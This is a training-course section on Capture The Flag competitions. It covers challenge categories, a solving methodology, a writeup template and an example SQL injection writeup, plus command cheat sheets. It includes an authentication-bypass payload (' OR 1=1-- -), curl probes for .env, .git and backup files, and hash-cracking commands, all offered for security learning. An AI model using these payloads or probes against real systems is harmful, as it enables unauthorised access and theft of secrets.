# 07 — CTF Writeups: Notes, Templates & Methodology

> Capture The Flag competitions are the fastest way to build offensive skills. This section teaches you how to approach CTFs and document your solutions.

> 📋 **What You Will Do In This Section**
> - [ ] Understand the 7 CTF challenge categories and what skills they test
> - [ ] Follow the 5-step CTF approach methodology for any challenge
> - [ ] Use the writeup template to document every solution
> - [ ] Run quick commands for Web, Forensics, and Crypto challenges
> - [ ] Build a CTF toolkit with all essential tools installed

---

## 🔴 CTF Categories

> 💡 **Why This Matters**
> Each CTF category tests different skills. Knowing the categories helps you pick challenges that match your current skill level AND identify which skills to develop next. For VAPT work, focus on Web and Forensics first — those translate directly to real engagements.

| Category | Skills Tested | Common Challenges |
|----------|--------------|-------------------|
| Web | SQLi, XSS, SSRF, auth bypass | Login bypasses, API abuse, cookie manipulation |
| Pwn (Binary) | Buffer overflow, ROP, format strings | Binary exploitation, shellcode writing |
| Reverse Engineering | Disassembly, decompilation | Crack key generators, analyze malware |
| Crypto | RSA, AES, XOR, hash cracking | Decrypt messages, break weak crypto |
| Forensics | File analysis, PCAP, steganography | Hidden data extraction, memory analysis |
| OSINT | Information gathering | Find people/places from photos, metadata |
| Misc | Anything | Scripting challenges, trivia, puzzles |

---

## 🔴 CTF Approach Methodology

> 💡 **Why This Matters**
> Random guessing wastes time in timed CTFs. This 5-step framework gives you a repeatable process that maximizes your chances of capturing the flag within the time limit.

```
1. READ THE CHALLENGE (2 min)
   ├── What category?
   ├── What's provided? (URL, file, binary, network capture)
   ├── What's the flag format? (flag{...}, CTF{...}, etc.)
   └── Any hints in the description?

2. ENUMERATE (5 min)
   ├── Web: View source, check cookies, intercept requests, directory scan
   ├── Binary: file, strings, checksec, strace/ltrace, disassemble
   ├── Crypto: Identify cipher, check key length, look for patterns
   ├── Forensics: file, exiftool, binwalk, foremost, volatility
   └── OSINT: Reverse image search, metadata, social media

3. IDENTIFY THE VULNERABILITY (5 min)
   ├── What's the intended weakness?
   ├── Is this a known pattern? (Google the pattern)
   └── Can you find a CVE or technique writeup?

4. EXPLOIT (varies)
   ├── Write/find the exploit
   ├── Adapt for this specific challenge
   └── Capture the flag

5. DOCUMENT (5 min)
   ├── Write the approach
   ├── Include exact commands/payloads
   ├── Explain WHY it works
   └── Note what you learned
```

#### 🧪 Try It Now — CTF Approach Drill

```bash
echo "=== CTF Challenge Quick Analysis ==="
echo ""
echo "Before touching the keyboard, answer:"
echo "  1. What CATEGORY is this? (Web/Pwn/Crypto/Forensics/Misc)"
echo "  2. What's PROVIDED? (URL/file/binary/PCAP)"
echo "  3. What's the FLAG FORMAT? (flag{...}/CTF{...}/etc.)"
echo "  4. What's the SIMPLEST possible attack?"
echo ""
echo "If Web: View source first → curl -s URL | grep -i flag"
echo "If File: file mystery → strings mystery | grep flag"
echo "If PCAP: tshark -r capture.pcap -Y http | grep flag"
```

---

## 🔴 Writeup Template

> 💡 **Why This Matters**
> Writing CTF writeups builds two critical skills: (1) clear technical documentation (essential for pentest reports), and (2) knowledge retention — you remember solutions you documented 10x better than ones you didn't.

```markdown
# [Challenge Name] — [CTF Name] [Year]

## Overview
| Field | Value |
|-------|-------|
| Category | Web / Pwn / Crypto / Forensics / Misc |
| Difficulty | Easy / Medium / Hard |
| Points | 100 |
| Solves | 42 |
| Flag | `flag{example_flag_here}` |

## Description
> [Paste the original challenge description here]

## Reconnaissance

### Initial Analysis
[What did you notice first? What tools did you use?]

```bash
# Commands you ran during reconnaissance
```

### Key Observations
1. [First important observation]
2. [Second important observation]

## Vulnerability

**Type**: [SQL Injection / Buffer Overflow / Weak Crypto / etc.]
**Location**: [Where the vulnerability exists]
**Root Cause**: [What's the developer mistake?]

## Exploitation

### Step 1: [First step]
```bash
# Exact command or payload
```
[Explain what this does]

### Step 2: [Flag capture]
```bash
# Final command
```

## Flag
```
flag{example_flag_here}
```

## Lessons Learned
- [What new technique did you learn?]
- [What similar vulnerabilities exist in real systems?]

## References
- [Relevant links]
```

---

## 🔴 Example Writeup: SQL Injection Challenge

```markdown
# EasyLogin — ExampleCTF 2024

## Overview
| Field | Value |
|-------|-------|
| Category | Web |
| Difficulty | Easy |
| Points | 100 |
| Flag | `flag{sql_1nj3ct10n_1s_st1ll_r3al}` |

## Description
> Can you login as admin? http://challenge.ctf.com:8080

## Reconnaissance

### Initial Analysis
Visited the URL — simple login form with username and password fields.

```bash
curl -sI http://challenge.ctf.com:8080
# Server: Apache/2.4.41
# X-Powered-By: PHP/7.4.3
```

Intercepted the login request with Burp:
```http
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```
Response: "Invalid credentials"

### Key Observations
1. PHP backend — likely MySQL database
2. No client-side validation
3. Error response same for invalid user and invalid password

## Vulnerability

**Type**: SQL Injection (Authentication Bypass)
**Location**: `username` parameter in POST /login.php
**Root Cause**: User input concatenated into SQL query without parameterization

## Exploitation

### Step 1: Confirm SQL Injection
```http
POST /login.php HTTP/1.1
username=admin'&password=test
```
Response: MySQL error → SQLi confirmed

### Step 2: Bypass Authentication
```http
POST /login.php HTTP/1.1
username=admin' OR 1=1-- -&password=anything
```
Response: Redirect to /dashboard.php with flag displayed

## Flag
```
flag{sql_1nj3ct10n_1s_st1ll_r3al}
```

## Lessons Learned
- Always test login forms for SQLi with a single quote first
- PHP + MySQL is a classic SQLi target
- Real-world: This exact vulnerability still exists in production applications
```

---

## 🔴 Quick Command Reference For CTFs

### Web Challenges

```bash
# View source and search for flags/comments
curl -s TARGET | grep -i "flag\|comment\|hidden\|<!--"

# Check robots.txt and common files
curl TARGET/robots.txt
curl TARGET/.git/HEAD
curl TARGET/.env
curl TARGET/backup.zip

# Directory scan
gobuster dir -u TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50

# Cookie analysis
curl -v TARGET 2>&1 | grep -i "set-cookie"

# JavaScript analysis for endpoints/secrets
curl -s TARGET | grep -oP 'src="[^"]*\.js"' | while read js; do
  curl -s "$TARGET/$(echo $js | cut -d'"' -f2)" | grep -i "flag\|api_key\|secret"
done
```

> 🔧 **If Stuck on Web**
> 1. View source → Search for HTML comments with flags
> 2. Check cookies → Base64-decode them (`echo 'cookie' | base64 -d`)
> 3. Try SQLi on login → `' OR 1=1-- -`
> 4. Check for hidden endpoints → `/robots.txt`, `/.git/`, `/admin/`

### Forensics Challenges

```bash
# Identify file type
file mystery_file
exiftool mystery_file

# Extract hidden data
binwalk mystery_file
binwalk -e mystery_file    # Auto-extract
foremost mystery_file       # File carving
steghide extract -sf image.jpg  # Steganography
zsteg image.png             # PNG steganography
strings mystery_file | grep -i flag

# PCAP analysis
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
tshark -r capture.pcap -Y "http.response" -T fields -e http.file_data | grep flag
strings capture.pcap | grep -i flag
```

> 🔧 **If Stuck on Forensics**
> 1. Run `file` first — the extension might be wrong
> 2. Run `strings | grep flag` — brute force the easy wins
> 3. Try `binwalk -e` — files embedded in files is very common
> 4. Check metadata with `exiftool` — flags hide in EXIF data

### Crypto Challenges

```bash
# Base64
echo 'dGVzdA==' | base64 -d

# Hex
echo '68656c6c6f' | xxd -r -p

# ROT13
echo 'grfg' | tr 'a-zA-Z' 'n-za-mN-ZA-M'

# Hash identification
hashid 'HASH_VALUE'
# Or: https://hashes.com/en/tools/hash_identifier

# Hash cracking
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt  # MD5
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Online: https://crackstation.net/
```

> 🔧 **If Stuck on Crypto**
> 1. Use CyberChef (gchq.github.io/CyberChef) — it auto-detects encodings
> 2. Look for patterns: `==` ending = Base64, all hex = hex, `{` = possibly Caesar
> 3. RSA with small n → factorize at factordb.com
> 4. XOR cipher → try single-byte XOR brute force first

---

## 🔴 CTF Platforms

| Platform | URL | Type | Best For |
|----------|-----|------|----------|
| HackTheBox | hackthebox.com | Machines + Challenges | Real-world pentesting |
| TryHackMe | tryhackme.com | Guided rooms | Learning path |
| PicoCTF | picoctf.org | Challenges | Beginners |
| CTFtime | ctftime.org | CTF calendar | Finding competitions |
| OverTheWire | overthewire.org | Wargames | Linux/Bash skills |
| CryptoHack | cryptohack.org | Challenges | Cryptography |
| pwnable.kr | pwnable.kr | Challenges | Binary exploitation |
| PortSwigger Academy | portswigger.net/web-security | Labs | Web security |

---

## 📋 CTF Toolkit Checklist

```
ESSENTIAL — Install before your first CTF:
□ Burp Suite configured with browser proxy
□ Python3 with pwntools, requests, pycryptodome
□ GDB with GEF/peda/pwndbg
□ Ghidra or IDA Free (reverse engineering)
□ CyberChef bookmarked (gchq.github.io/CyberChef)
□ Wireshark installed
□ SecLists downloaded (/usr/share/seclists)
□ John the Ripper + Hashcat ready
□ Docker available (for isolated environments)
□ Note-taking system (markdown recommended)
```

#### 🧪 Try It Now — Toolkit Verification

```bash
echo "=== CTF Toolkit Check ==="
for tool in python3 gdb strings file exiftool binwalk curl nc hashcat john wireshark; do
  which $tool &>/dev/null && echo "  ✅ $tool" || echo "  ❌ $tool (install needed)"
done
echo ""
echo "Python libraries:"
for lib in pwntools requests pycryptodome; do
  python3 -c "import $lib" 2>/dev/null && echo "  ✅ $lib" || echo "  ❌ $lib (pip3 install $lib)"
done
```

> ✅ **Expected Output**
> A checklist showing which tools are installed and which you need to install.

---

## 🧠 If You're Stuck

1. **Challenge seems impossible**: Re-read the description — there's usually a hint you missed
2. **No idea what category this is**: Run `file` on any provided file. Check the source of any URL.
3. **Found something but can't get the flag**: The flag format matters. grep for it: `grep -ri "flag{" .`
4. **First CTF overwhelming**: Start with PicoCTF or TryHackMe. They have guided challenges.
5. **Want to get faster**: Practice the same challenge type repeatedly. Speed comes from pattern recognition.

---

## 🧠 Section 07 Complete — Self-Check

Before moving to `08-bug-bounty/`, verify you can:

- [ ] Identify a CTF challenge's category from its description
- [ ] Use the 5-step methodology without looking at notes
- [ ] Write a complete writeup using the template
- [ ] Run file/strings/binwalk on a mystery file
- [ ] Decode Base64, hex, and ROT13 from command line
- [ ] Navigate CyberChef for complex encoding chains
